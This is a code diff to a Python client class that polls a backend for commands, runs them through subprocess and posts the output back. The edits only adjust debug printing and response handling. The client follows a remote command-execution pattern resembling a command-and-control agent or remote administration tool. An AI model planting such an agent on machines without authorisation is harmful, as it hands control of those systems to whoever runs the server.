@@ -101,7 +101,7 @@ class Client:
 
     def run_command(self, cmd, **kwargs):
         # internal commands
-        print('[D] Running command')
+
         if cmd.get('command_type') == 1:
             print('[D] got internal command: %s' % cmd)
             try:
@@ -118,7 +118,7 @@ class Client:
 
         _command = cmd.get('command').split(' ')
         try:
-            print('[D] Running cmd "%s"' % _command)
+            print('[D] Running command "%s"' % _command)
             out = subprocess.check_output(_command, timeout=SUBPROCESS_TIMEOUT, **kwargs)
             result = out.decode('utf-8')
             self.send_result(cmd.get('uuid'), result)
@@ -136,7 +136,8 @@ class Client:
         })
         con.request('POST', '/command/results/', data, headers=DEFAULT_HEADERS)
         r = con.getresponse()
-        print(r.read())
+        if r.status == 201:
+            print("[D] Results saved in backend")
         con.close()
 
     def receive_commands(self):
@@ -155,9 +156,9 @@ class Client:
             if r.status == 200:
                 try:
                     r = json.loads(content)
+                    return r
                 except:
                     return None
-                return r
             time.sleep(COMMAND_INTERVAL)
 
     def register_client(self):
